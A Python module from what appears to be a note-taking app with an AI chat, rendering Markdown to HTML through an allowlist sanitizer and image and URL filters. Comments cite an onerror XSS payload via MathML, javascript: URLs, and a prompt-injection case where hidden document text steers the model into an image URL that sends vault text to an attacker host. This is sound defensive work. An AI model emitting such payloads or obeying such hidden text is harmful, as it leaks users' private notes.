# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Alessandro Carosia

"""Obsidian-flavoured Markdown to the HTML the app and the published pages draw, and the
allowlist that HTML passes. No route and no session here: `public_site` builds a site
from this module without loading the app."""
from __future__ import annotations

import glob
import html as _html
import re
from html.parser import HTMLParser
from pathlib import Path
from urllib.parse import quote as _quote

from silica.config import CONFIG
from silica.kernel.base.markdown import strip_ofm_meta as _strip_ofm_meta
from silica.kernel.graph.mindmap import answer_resolver
from silica.kernel.text import note_parts


# A whitespace-delimited path-like token: contains "/" or ends in ".md".
_PATHLIKE = re.compile(r"[^\s\[\]]*(?:/[^\s\[\]]*|\.md)")
WIKILINK = re.compile(r"(!?)\[\[([^\]\[]+)\]\]")  # optional ! marks an embed
_TRAIL = ".,;:!?)"  # sentence punctuation to peel off a bare path token

# Vault attachments the drawer may inline; served only through /asset.
ASSET_EXTS = {".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg", ".bmp"}

# An SVG is a document, not just a picture: an <img> context runs none of its
# scripts, but /asset is a same-origin URL a note can link and the address bar
# can reach, and a navigated SVG runs them on the GUI's origin. `sandbox` puts
# any such navigation in an opaque origin with scripting off, and default-src
# 'none' stops the file fetching anything; neither affects an <img> load, so
# inline vault images keep rendering. nosniff pins the guessed type, which is
# already correct for every extension above.
ASSET_HEADERS = {
    "Content-Security-Policy": "default-src 'none'; style-src 'unsafe-inline'; sandbox",
    "X-Content-Type-Options": "nosniff",
}

# --- OFM (Obsidian-flavored markdown) sugar ----------------------------------
# ==highlight== | #tag (letter-first, so #123 and hex colors stay literal)
_MARK_OR_TAG = re.compile(r"==([^=\n]+)==|(?<![\w#])#([A-Za-z_][\w/-]*)")
_CALLOUT_HEAD = re.compile(r"\[!(\w+)\][+-]?[ \t]*(.*)")  # first line of a callout quote
_TASK_HEAD = re.compile(r"^\[([ xX])\][ \t]+")  # first inline text of a task list item


def anchor(path: str, display: str) -> str:
    return (
        f'<a class="note-link" data-path="{_html.escape(path, quote=True)}">'
        f"{_html.escape(display)}</a>"
    )


def _embed_img(target: str, alias: str) -> str:
    """<img> for a `![[file.png]]` embed; a numeric alias is Obsidian's width.
    ponytail: target is taken vault-root-relative — no shortest-name resolution
    for attachments; index attachment names if that ever bites."""
    src = "/asset?path=" + _quote(target)
    width = f' width="{alias}"' if alias.isdigit() else ""
    stem = target.rsplit("/", 1)[-1].rsplit(".", 1)[0]
    alt = stem if alias.isdigit() or not alias else alias
    return f'<img src="{_html.escape(src, quote=True)}" alt="{_html.escape(alt, quote=True)}"{width}>'


_RAW_IMG_SRC = re.compile(r"""(<img\b[^>]*?\bsrc\s*=\s*)(["'])(.*?)\2""", re.IGNORECASE | re.DOTALL)


def _rewrite_raw_img_src(html: str) -> str:
    """Route a raw-HTML ``<img src="assets/x.png">`` through /asset.

    markdown-it's commonmark preset passes raw HTML through, and the image
    rewrite in _render only reaches markdown-native ``![alt](path)`` tokens. A
    note written for GitHub uses the HTML form instead, so its src arrived
    intact and the browser resolved it against the page origin: the drawer
    404'd on every such image and showed the alt text in a box. Absolute,
    external, anchor and data: URLs pass untouched, same rule as the token
    path."""
    def sub(m: "re.Match[str]") -> str:
        src = m.group(3)
        if not src or src.startswith(("http://", "https://", "data:", "/", "#")):
            return m.group(0)
        return f"{m.group(1)}{m.group(2)}/asset?path={_quote(src)}{m.group(2)}"

    return _RAW_IMG_SRC.sub(sub, html)


# --- raw-HTML allowlist ------------------------------------------------------
# markdown-it's commonmark preset passes raw HTML through verbatim, and a note
# body is untrusted input: it can arrive from a nucleated document written by
# anyone. app-chat.js writes this render with innerHTML, so whatever is emitted here
# executes on the GUI's own origin, which can reach /chat, /note and /settings.
#
# Raw HTML stays SUPPORTED — <br>, <details>, <img> are ordinary Obsidian markup
# and the app already post-processes it (_rewrite_raw_img_src) — but it may not
# execute. The fragment is re-parsed and re-serialized from these allowlists, so
# an unknown tag or attribute is dropped by construction; nothing is ever matched
# against a list of known payloads.
#
# The families are kept whole on purpose: a note that writes `<b>` rather than
# `**b**` (every README authored for GitHub does) must still read as bold, and a
# raw table that keeps `<td>` but loses its `<caption>` is a worse render than no
# allowlist at all. Every tag below is inert markup — none can carry a URL or a
# behavior — so admitting the whole family costs nothing the allowlist protects.
_ALLOWED_TAGS = frozenset({
    "a", "abbr", "b", "blockquote", "br", "caption", "code", "dd", "details",
    "div", "dl", "dt", "em", "figcaption", "figure", "h1", "h2", "h3", "h4",
    "h5", "h6", "hr", "i", "img", "input", "kbd", "li", "mark", "ol", "p",
    "pre", "s", "small", "span", "strong", "sub", "summary", "sup", "table",
    "tbody", "td", "tfoot", "th", "thead", "tr", "u", "ul",
})
# Attributes are allowlisted per tag on top of these two. No `on*` handler and no
# `style` is listed anywhere below, and that omission IS the rule: an event
# handler is a script, and a style declaration cannot be vetted from here.
_ATTRS_ANY = frozenset({"class", "title"})
_ATTRS_BY_TAG = {
    "a": frozenset({"href"}),
    "img": frozenset({"src", "alt", "width", "height"}),
    "input": frozenset({"type", "checked", "disabled"}),
    "details": frozenset({"open"}),
    "ol": frozenset({"start"}),
    "td": frozenset({"colspan", "rowspan"}),
    "th": frozenset({"colspan", "rowspan", "scope"}),
}
_URL_ATTRS = frozenset({"href", "src"})
_VOID_TAGS = frozenset({"br", "hr", "img", "input"})
# script/style bodies are raw text, not prose: HTMLParser hands them to
# handle_data, so they are dropped with the tag instead of landing in the page.
_RAW_TEXT_TAGS = frozenset({"script", "style"})
_URL_SCHEME = re.compile(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:")


def _safe_url(value: str, tag: str) -> str | None:
    """The URL as written, or None when the attribute must be dropped.

    Relative URLs pass (that is how a note names a vault attachment, and how the
    app's own /asset route is reached); http/https pass; a data: URL passes only
    as an image source, which is how a note carries an inline picture. Every
    other scheme is refused — `javascript:` is the whole reason this exists, and
    the check is on the value with control characters and spaces removed,
    because `java\tscript:` is still that scheme to a browser.
    """
    probe = "".join(ch for ch in value if ord(ch) > 0x20)
    if not _URL_SCHEME.match(probe):
        return value
    low = probe.lower()
    if low.startswith(("http://", "https://")):
        return value
    if tag == "img" and low.startswith("data:image/"):
        return value
    return None


class _HtmlAllowlist(HTMLParser):
    """Re-serialize a raw-HTML fragment, keeping only allowlisted markup.

    Anything not allowlisted is escaped rather than emitted, so it shows as text
    instead of silently vanishing (and cannot run either way).
    """

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.out: list[str] = []
        # Body of an open raw-text element, held rather than dropped: see close().
        self._raw_text: list[str] | None = None

    def close(self) -> None:
        super().close()
        # A `<script>` that never closes makes markdown-it hand the WHOLE rest of
        # the note over as one html_block (its raw-text rule runs to the closing
        # tag or to EOF), so everything after it is prose, not a script body, and
        # dropping it silently emptied the note from that line down. Only a body
        # that was actually terminated by its own tag is a script.
        if self._raw_text:
            self.out.append(_html.escape("".join(self._raw_text), quote=False))
        self._raw_text = None

    def result(self) -> str:
        return "".join(self.out)

    def _emit_tag(self, tag: str, attrs) -> bool:
        if tag not in _ALLOWED_TAGS:
            return False
        # `or ""`: HTMLParser reports a valueless attribute (`<input type>`) as
        # None, and the drawer promises never to 500 on a note body.
        if tag == "input" and (dict(attrs).get("type") or "").strip().lower() != "checkbox":
            return False  # a task checkbox is the only <input> a note renders
        allowed = _ATTRS_ANY | _ATTRS_BY_TAG.get(tag, frozenset())
        parts = [tag]
        for name, value in attrs:
            name = name.lower()
            if name not in allowed:
                continue
            if value is None:
                parts.append(name)
                continue
            if name in _URL_ATTRS:
                value = _safe_url(value, tag)
                if value is None:
                    continue
            parts.append(f'{name}="{_html.escape(value, quote=True)}"')
        self.out.append("<" + " ".join(parts) + ">")
        return True

    def handle_starttag(self, tag, attrs):
        if tag in _RAW_TEXT_TAGS and self._raw_text is None:
            self._raw_text = []
        if not self._emit_tag(tag, attrs):
            self.out.append(_html.escape(self.get_starttag_text() or f"<{tag}>"))

    def handle_startendtag(self, tag, attrs):
        # `<br/>`: the start tag alone, never a stray `</br>`.
        if not self._emit_tag(tag, attrs):
            self.out.append(_html.escape(self.get_starttag_text() or f"<{tag}/>"))

    def handle_endtag(self, tag):
        if tag in _RAW_TEXT_TAGS:
            self._raw_text = None  # closed by its own tag: that body was a script
        if tag in _ALLOWED_TAGS:
            if tag not in _VOID_TAGS:
                self.out.append(f"</{tag}>")
            return
        self.out.append(_html.escape(f"</{tag}>"))

    def handle_data(self, data):
        if self._raw_text is not None:
            self._raw_text.append(data)
            return
        self.out.append(_html.escape(data, quote=False))

    # Comments, doctypes, CDATA sections and processing instructions carry no
    # prose and are how markup gets smuggled past a naive parser: dropped.
    def handle_comment(self, data):
        pass

    def handle_decl(self, decl):
        pass

    def unknown_decl(self, data):
        pass

    def handle_pi(self, data):
        pass


def _sanitize_html(fragment: str) -> str:
    parser = _HtmlAllowlist()
    parser.feed(fragment)
    parser.close()
    return parser.result()


def _sanitize_raw_tokens(tokens) -> None:
    """Allowlist the note's own raw HTML in the token stream, in place.

    Runs on the parser output and nowhere later: every html_block/html_inline
    added after this point is built by this module (mermaid, MathML, callout
    titles, task checkboxes, the linkified prose) and re-sanitizing it would
    strip the MathML the math renderer just produced.
    """
    for tok in tokens:
        if tok.type in ("html_block", "html_inline"):
            tok.content = _sanitize_html(tok.content)
        elif tok.type == "inline" and tok.children:
            _sanitize_raw_tokens(tok.children)


# A read note's title, at least this long, links where an answer names it bare.
# Shorter titles ("ML", "Note") are words more often than they are notes.
MENTION_MIN_CHARS = 4


def _mentions(reads) -> tuple[re.Pattern, dict[str, str]] | None:
    """The bare-name layer for an answer (ADR-0127): the notes its turn read,
    by title and by path with or without .md, longest first, matched as
    written. The path because a model writes "Corso A/Lezione 16", whose space
    the path-token layer splits at (seen on the first GUI turn, 2026-10-22).
    Case-sensitive on purpose: an answer names "Lezione 16" as the note is
    titled, and "lezione" in prose is a word. A title two read notes share
    links neither; their paths still do."""
    by_title: dict[str, str | None] = {}
    found: dict[str, str] = {}
    for path in reads or ():
        stem = path.removesuffix(".md")
        title = stem.rsplit("/", 1)[-1]
        if "/" in stem:
            found[path] = found[stem] = path
        if len(title) >= MENTION_MIN_CHARS:
            by_title[title] = None if title in by_title else path
    found |= {t: p for t, p in by_title.items() if p}
    if not found:
        return None
    alts = "|".join(re.escape(t) for t in sorted(found, key=len, reverse=True))
    return re.compile(rf"(?<![\w/])(?:{alts})(?!\w)"), found


def _linkify_text(text: str, resolve, mentions=None) -> str:
    """Turn resolvable note refs in one plain-text run into `.note-link` anchors.

    Three layers: wikilinks first (explicit `[[...]]` delimiters), then bare
    path-like tokens in the surviving prose, then, for an answer, the bare
    titles of the notes its turn read (`mentions`). Unresolved wikilinks render
    like resolved ones but tagged `.broken` (no data-path — the click is a
    no-op); unresolved bare paths stay verbatim. A resolver that answers ""
    (a name several notes share) leaves the text as written. `resolve=None`
    means plain escape. Returns an HTML fragment (safe parts escaped).
    """
    if resolve is None:
        return _html.escape(text)

    def link_paths(prose: str) -> str:
        out, pos = [], 0
        for m in _PATHLIKE.finditer(prose):
            out.append(_html.escape(prose[pos:m.start()]))
            tok = m.group(0)
            core = tok.rstrip(_TRAIL)
            tail = tok[len(core):]
            hit = resolve(core)
            if hit:
                out.append(anchor(hit, note_parts.clean_name(core)) + _html.escape(tail))
            else:
                out.append(_html.escape(tok))
            pos = m.end()
        out.append(_html.escape(prose[pos:]))
        return "".join(out)

    def link_prose(prose: str) -> str:
        # The read notes first: they are exact names, and the path-token layer
        # would split "Corso A/Lezione 16" at its space before they were seen.
        if mentions is None:
            return link_paths(prose)
        pattern, found = mentions
        out, pos = [], 0
        for m in pattern.finditer(prose):
            out.append(link_paths(prose[pos:m.start()]) + anchor(found[m.group(0)], m.group(0)))
            pos = m.end()
        out.append(link_paths(prose[pos:]))
        return "".join(out)

    out, pos = [], 0
    for m in WIKILINK.finditer(text):
        out.append(link_prose(text[pos:m.start()]))
        bang, inner = m.group(1), m.group(2)
        target, _, alias = inner.partition("|")
        target, alias = target.strip(), alias.strip()
        # Obsidian subpath (#center alignment hint, #heading anchor): irrelevant
        # to serving a raster attachment, and it would defeat the ext check.
        target = target.split("#", 1)[0].strip()
        if bang and "." + target.rsplit(".", 1)[-1].lower() in ASSET_EXTS:
            out.append(_embed_img(target, alias))
        else:
            hit = resolve(target)
            display = alias or note_parts.clean_name(target)
            if hit:
                out.append(anchor(hit, display))
            elif hit == "":
                # Several notes carry the name and nothing says which one
                # (ADR-0114): the words stay, no guess and no "broken" mark.
                out.append(_html.escape(display))
            else:
                out.append(f'<a class="note-link broken">{_html.escape(display)}</a>')
        pos = m.end()
    out.append(link_prose(text[pos:]))
    return "".join(out)


def _inline_ofm(text: str, resolve, mentions=None) -> str:
    """OFM inline sugar over one plain-text run: ==highlight== -> <mark>,
    #tag -> chip. Prose between matches still goes through note-ref linking."""
    out, pos = [], 0
    for m in _MARK_OR_TAG.finditer(text):
        out.append(_linkify_text(text[pos:m.start()], resolve, mentions))
        if m.group(1) is not None:
            out.append(f"<mark>{_linkify_text(m.group(1), resolve, mentions)}</mark>")
        else:
            out.append(f'<span class="tag">#{_html.escape(m.group(2))}</span>')
        pos = m.end()
    out.append(_linkify_text(text[pos:], resolve, mentions))
    return "".join(out)


def _ofm_blocks(tokens) -> None:
    """OFM block sugar, rewriting the token stream in place: ```mermaid fences
    become client-rendered <pre class="mermaid">, `> [!kind] title` blockquotes
    become callouts, and `- [ ]` list items become checkbox tasks."""
    from markdown_it.token import Token

    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if tok.type == "fence" and tok.info.strip() == "mermaid":
            raw = Token("html_block", "", 0)
            raw.content = f'<pre class="mermaid">{_html.escape(tok.content)}</pre>\n'
            tokens[i] = raw
        elif tok.type == "math_block":
            raw = Token("html_block", "", 0)
            raw.content = f'<div class="math">{mathml(tok.content, display=True)}</div>\n'
            tokens[i] = raw
        elif tok.type == "blockquote_open":
            j = next((k for k in range(i + 1, len(tokens)) if tokens[k].type == "inline"), None)
            kids = tokens[j].children if j is not None else None
            first = kids[0] if kids else None
            m = _CALLOUT_HEAD.match(first.content) if first is not None and first.type == "text" else None
            if m:
                kind = m.group(1).lower()
                tok.attrJoin("class", f"callout callout-{kind}")
                rest = kids[1:] if kids else []
                if rest and rest[0].type == "softbreak":
                    rest = rest[1:]
                tokens[j].children = rest
                head = Token("html_block", "", 0)
                title = m.group(2).strip() or kind
                head.content = f'<p class="callout-title">{_html.escape(title)}</p>\n'
                tokens.insert(i + 1, head)
                i += 1  # skip the injected title
        elif (
            tok.type == "list_item_open"
            and i + 2 < len(tokens)
            and tokens[i + 1].type == "paragraph_open"
            and tokens[i + 2].type == "inline"
            and tokens[i + 2].children
        ):
            first = tokens[i + 2].children[0]
            m = _TASK_HEAD.match(first.content) if first.type == "text" else None
            if m:
                tok.attrJoin("class", "task")
                first.content = first.content[m.end():]
                box = Token("html_inline", "", 0)
                checked = " checked" if m.group(1) in "xX" else ""
                box.content = f'<input type="checkbox" disabled{checked}> '
                tokens[i + 2].children.insert(0, box)
        i += 1


# A math block is injected AFTER the raw-HTML allowlist has run (the allowlist
# would strip the MathML), so what the converter emits is the last word — and
# `\text{…}` is copied into <mtext> character for character. <mtext> is a MathML
# text integration point: the browser switches back to HTML parsing rules inside
# it, so `$$\text{<img/src=x/onerror=…>}$$` lands a live element with a live
# handler in the page. These are the tags and attributes latex2mathml itself can
# emit; anything else in the tree came from the note. `href` and `style` are
# deliberately absent — `\href{…}` and `\style{…}` put a note-authored URL and a
# note-authored declaration on the element, and neither can be vetted from here.
_MATHML_TAGS = frozenset({
    "math", "menclose", "merror", "mfrac", "mi", "mmultiscripts", "mn", "mo",
    "mover", "mpadded", "mphantom", "mprescripts", "mroot", "mrow", "ms",
    "mspace", "msqrt", "mstyle", "msub", "msubsup", "msup", "mtable", "mtd",
    "mtext", "mtr", "munder", "munderover", "none",
})
_MATHML_ATTRS = frozenset({
    "accent", "accentunder", "border-color", "class", "close", "columnalign", "columnlines",
    "columnspacing", "columnspan", "depth", "display", "displaystyle", "fence",
    "form", "height", "largeop", "linebreak", "linethickness", "lspace",
    "mathbackground", "mathcolor", "mathsize", "mathvariant", "maxsize",
    "minsize", "movablelimits", "notation", "open", "rowalign", "rowlines",
    "rowspacing", "rowspan", "rspace", "scriptlevel", "separator", "separators",
    "stretchy", "symmetric", "voffset", "width", "xmlns",
})


class _MathMLProbe(HTMLParser):
    """Flags any markup in a converted formula that latex2mathml cannot emit.

    A probe, not a rewriter: the converted string is returned untouched or not at
    all, so a formula the browser accepts today keeps rendering byte for byte.
    Comments, declarations and processing instructions count as foreign too —
    the converter emits none, and an unterminated `<!--` swallows the rest of the
    note in the browser while HTMLParser reads it as nothing.
    """

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.foreign = False

    def handle_starttag(self, tag, attrs):
        if tag not in _MATHML_TAGS or any(n.lower() not in _MATHML_ATTRS for n, _ in attrs):
            self.foreign = True

    def handle_endtag(self, tag):
        if tag not in _MATHML_TAGS:
            self.foreign = True

    def handle_comment(self, data):
        self.foreign = True

    def handle_decl(self, decl):
        self.foreign = True

    def unknown_decl(self, data):
        self.foreign = True

    def handle_pi(self, data):
        self.foreign = True


def mathml(tex: str, display: bool) -> str:
    """LaTeX -> MathML, rendered natively by the browser (no client JS/fonts).
    A failed conversion degrades to the escaped source in a code span, and so
    does one carrying markup the converter cannot have produced itself."""
    try:
        from latex2mathml.converter import convert

        out = convert(tex, display="block" if display else "inline")
        probe = _MathMLProbe()
        probe.feed(out)
        probe.close()
        if not probe.foreign:
            return out
    except Exception:
        pass
    fence = "$$" if display else "$"
    return f'<code class="math-err">{_html.escape(fence + tex + fence)}</code>'


def _highlight(code: str, lang: str, _attrs: str) -> str:
    """Pygments fence highlighting; empty string falls back to a plain fence.
    Token colors live in app-chat.css, mapped onto the site palette."""
    try:
        from pygments import highlight
        from pygments.formatters import HtmlFormatter
        from pygments.lexers import get_lexer_by_name

        lexer = get_lexer_by_name(lang)
    except Exception:  # no/unknown language — markdown-it escapes it plain
        return ""
    return highlight(code, lexer, HtmlFormatter(nowrap=True))


def _is_own_image(src: str) -> bool:
    """Whether an image source stays on this origin: the vault through /asset,
    or inline data. An allowlist and not an `http(s)://` test, because
    `//host/x` and `/\\host/x` (a browser reads `\\` as `/`) carry no scheme and
    still fetch from the host they name; the first draft of ADR-0098 H6 missed
    both. Control characters and spaces go first, as `_safe_url` drops them."""
    probe = "".join(ch for ch in _html.unescape(src) if ord(ch) > 0x20).lower()
    return probe.startswith(("/asset?", "data:image/"))


def _foreign_img_link(src: str) -> str:
    """An image from another origin as a link that names the host it would
    have been fetched from: the student can still open it, by a click."""
    from urllib.parse import urlsplit

    parts = urlsplit("".join(ch for ch in src if ord(ch) > 0x20).replace("\\", "/"))
    host = _html.escape(parts.hostname or "another site")
    if parts.scheme.lower() not in ("http", "https", ""):
        return f'<span class="remote-img">image from {host}</span>'
    return (f'<a class="remote-img" href="{_html.escape(src, quote=True)}" rel="noopener noreferrer" '
            f'target="_blank">image from {host}</a>')


# After _HtmlAllowlist every attribute is name="value" with `"` escaped, so a
# raw <img>'s source has this one shape.
_RAW_IMG_TAG = re.compile(r"<img\b[^>]*>", re.IGNORECASE)
_RAW_SRC_ATTR = re.compile(r'\ssrc="([^"]*)"')


def _unembed_foreign_imgs(fragment: str) -> str:
    def sub(m: "re.Match[str]") -> str:
        src = _RAW_SRC_ATTR.search(m.group(0))
        if not src or _is_own_image(src.group(1)):
            return m.group(0)
        return _foreign_img_link(_html.unescape(src.group(1)))

    return _RAW_IMG_TAG.sub(sub, fragment)


# A pipe inside a table cell ends the cell and splits the row: an aliased
# wikilink ("[[Attenzione|attenzione]]" in an aid's table) and an absolute
# value in a formula ("$|y_i f(x)| > \gamma$" in a summary's table), both
# 2026-10-23. Obsidian asks for `\|` in a link, which reaches the cell's text
# as `|` so the alias still resolves; in a formula `\|` would read as a norm,
# so its bars become `\vert` and `\Vert`, which draw the same.
_TABLE_ALIAS = re.compile(r"\[\[([^\]\[|\\]+)\|([^\]\[]+)\]\]")
_TABLE_MATH = re.compile(r"(?<!\$)\$(?!\$)([^$\n]+?)\$")


def _escape_table_aliases(text: str) -> str:
    if "|" not in text:
        return text

    def math(m: re.Match) -> str:
        return "$" + m.group(1).replace("\\|", "\\Vert ").replace("|", "\\vert ") + "$"

    return "\n".join(_TABLE_MATH.sub(math, _TABLE_ALIAS.sub(r"[[\1\\|\2]]", line))
                     if line.lstrip().startswith("|") else line for line in text.split("\n"))


def linkify(text: str, resolve=None, remote_images: bool = True, reads=()) -> str:
    """Render markdown (+ OFM sugar) to HTML, linkifying resolvable note refs
    when `resolve` is given. Works on the markdown-it token stream, so
    `code_inline`/`fence` are separate token types and code is never linkified
    or tag-ified by construction. `reads` (an answer's: the notes its turn
    read) also links their titles where the prose names them bare.

    `remote_images=False` is for anything the model wrote: an image from
    another origin becomes a link naming its host. Text a document hid from the
    student can steer an answer into `![](https://attacker/?d=<vault text>)`,
    which the browser fetched the moment it drew it (reproduced 2026-10-13,
    ADR-0098 H6). A note keeps its web images, as Obsidian draws them."""
    from markdown_it import MarkdownIt
    from markdown_it.token import Token
    from mdit_py_plugins.dollarmath import dollarmath_plugin
    from mdit_py_plugins.footnote import footnote_plugin

    from silica.kernel.base.markdown import join_code_aliases

    text = _escape_table_aliases(_strip_ofm_meta(text or ""))
    md = (
        MarkdownIt(options_update={"highlight": _highlight})
        .enable("table")
        .enable("strikethrough")
        .enable("linkify")
    )
    md.options["linkify"] = True
    # fuzzy_link off or `nota.md` in prose resolves to the Moldovan ccTLD and
    # renders as a link to http://nota.md; fuzzy_email off keeps the scope at
    # "a URL is clickable", not "prose opens a mail client".
    if md.linkify is not None:  # only present with the [linkify] extra
        md.linkify.set({"fuzzy_link": False, "fuzzy_email": False})
    # allow_space=False keeps prose prices ("$5 and $10") out of math.
    # double_inline: a `$$...$$` line inside a paragraph is display math, as in
    # Obsidian and Pandoc. The block rule cannot interrupt a paragraph, so
    # without it the inline rule ate one `$` of each pair and left two on screen
    # around the formula (chat 4b3dfdab7b64, 2026-11-01).
    md.use(dollarmath_plugin, allow_space=False, allow_digits=False, double_inline=True)
    # Without it a `## Sources` definition `[^L]: [[sources/X]]` parsed as a
    # link reference whose target was the literal `[[sources/X]]`, and clicking
    # the marker navigated away from the app (ADR-0055 prerequisite). Its
    # `#fn1` anchors are scrolled in place by the client, never routed.
    md.use(footnote_plugin)
    tokens = md.parse(text)
    mentions = _mentions(reads) if resolve is not None else None
    _sanitize_raw_tokens(tokens)  # the note's raw HTML; must precede the injected kind
    _ofm_blocks(tokens)
    for tok in tokens:
        if tok.type == "html_block":
            tok.content = _rewrite_raw_img_src(tok.content)
            if not remote_images:
                tok.content = _unembed_foreign_imgs(tok.content)
            continue
        if tok.type != "inline" or not tok.children:
            continue
        new = []
        # Note refs are suppressed inside an anchor. `_PATHLIKE` matches any token
        # with a slash, so the display text of a link (an autolinked URL is its own
        # text) hit the basename fallback in _resolve_in and came back as a note:
        # `https://en.wikipedia.org/wiki/chemistry` rendered as a `.note-link` to
        # `chemistry.md`, nested inside the <a href> the browser then unnests.
        # Whoever writes `[...](url)` has already said where the link points.
        depth = 0
        for child in join_code_aliases(tok.children):
            if child.type == "link_open":
                depth += 1
            elif child.type == "link_close":
                depth = max(0, depth - 1)
            if child.type == "html_inline":
                child.content = _rewrite_raw_img_src(child.content)
                if not remote_images:
                    child.content = _unembed_foreign_imgs(child.content)
                new.append(child)
                continue
            if child.type == "image":
                # vault-relative image: route through /asset (absolute/external
                # and data: URLs pass untouched)
                src = str(child.attrGet("src") or "")
                if src and not src.startswith(("http://", "https://", "data:", "/")):
                    src = "/asset?path=" + _quote(src)
                    child.attrSet("src", src)
                if not remote_images and src and not _is_own_image(src):
                    link = Token("html_inline", "", 0)
                    link.content = _foreign_img_link(src)
                    new.append(link)
                    continue
                new.append(child)
                continue
            if child.type in ("math_inline", "math_inline_double"):
                raw = Token("html_inline", "", 0)
                raw.content = mathml(child.content, display=child.type == "math_inline_double")
                new.append(raw)
                continue
            if child.type != "text":
                new.append(child)
                continue
            frag = _inline_ofm(child.content, None if depth else resolve, mentions)
            raw = Token("html_inline", "", 0)
            raw.content = frag
            new.append(raw)
        tok.children = new
    return md.renderer.render(tokens, md.options, {})


def answer_html(answer: str, refs, graph=None) -> str:
    """A chat answer drawn with its turn's reads (ADR-0127): a name several
    notes share links the one the turn read, and a read note's title links
    where the answer names it bare. Reads the driver graph unless given one."""
    resolve, reads = answer_resolver(refs or (), graph=graph)
    return linkify(answer, resolve, remote_images=False, reads=reads)


def render_frontmatter(props: dict) -> str:
    """Properties box for the note drawer: native <details>, one row per key,
    list values as individual chips. Closed, and placed AFTER the body by the
    caller: the note is read for its text, and an open table of tags and dates
    above the first line was the first thing every note said (2026-09-22
    surfaces experiment). The summary row stays, so the reader who wants the
    metadata has one click and knows where it is."""
    rows = []
    for key, val in props.items():
        vals = val if isinstance(val, (list, tuple)) else [val]
        chips = "".join(
            f'<span class="fm-val">{_html.escape("" if v is None else str(v))}</span>'
            for v in vals
        )
        rows.append(
            f'<div class="fm-row"><span class="fm-key">{_html.escape(str(key))}</span>{chips}</div>'
        )
    return '<details class="fm"><summary>Properties</summary>' + "".join(rows) + "</details>"


def find_asset(path: str) -> Path | None:
    """The file /asset would serve for `path`, None when it would 404. Shared
    with the figure placement (ADR-0082), which must not put an embed in an
    answer that draws as a broken image."""
    if not path or not CONFIG.vault_path:
        return None
    if Path(path).suffix.lower() not in ASSET_EXTS:
        return None
    root = Path(CONFIG.vault_path).resolve()
    target = (root / path).resolve()
    found: Path | None = target
    if not (target.is_relative_to(root) and target.is_file()):
        # escaped: rglob reads the name as a pattern, so `fig[1].png` matched
        # fig1.png and a name holding `**` raised ValueError mid-answer
        found = next((p for p in root.rglob(glob.escape(Path(path).name)) if p.is_file()), None)
    if found is None or not found.is_relative_to(root) or found.suffix.lower() not in ASSET_EXTS:
        return None
    return found
